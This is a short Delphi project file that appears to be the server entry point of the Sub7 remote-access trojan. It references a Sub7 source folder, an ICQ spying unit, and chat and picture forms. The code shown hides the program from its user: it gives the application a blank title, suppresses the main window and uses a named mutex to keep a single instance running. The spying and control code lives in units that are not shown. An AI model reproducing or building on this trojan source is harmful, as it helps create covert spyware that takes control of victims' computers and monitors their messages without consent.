program server;

uses
  Windows,
  Forms,
  Unit1 in 'Unit1.pas' {Form1},
  Unit5 in 'Unit5.pas' {MyChat},
  ShowPictureUnit in 'ShowPictureUnit.pas' {frmPicture},
  ICQSpy in 'ICQSpy.pas',
  MatrixUnit in 'MatrixUnit.pas' {Matrix},
  ZLIBArchive in '..\..\Delphi4\_Sub7_2000\_ZIP\zlibarchive.PAS';

{$R *.RES}
var hMutex:THandle;
begin
 hMutex:=CreateMutex(nil,false,'@!MUIE');
 if WaitForSingleObject(hmutex,0)<>wait_TimeOut then begin end else HALT;
  Application.OnException:=Form1.HandleErrors;
  Application.Initialize;
  Application.Title := ' ';
  Application.ShowMainForm := false;
  Application.CreateForm(TForm1, Form1);
  Application.CreateForm(TMyChat, MyChat);
  Application.CreateForm(TfrmPicture, frmPicture);
  Application.CreateForm(TMatrix, Matrix);
  Application.Run;
end.

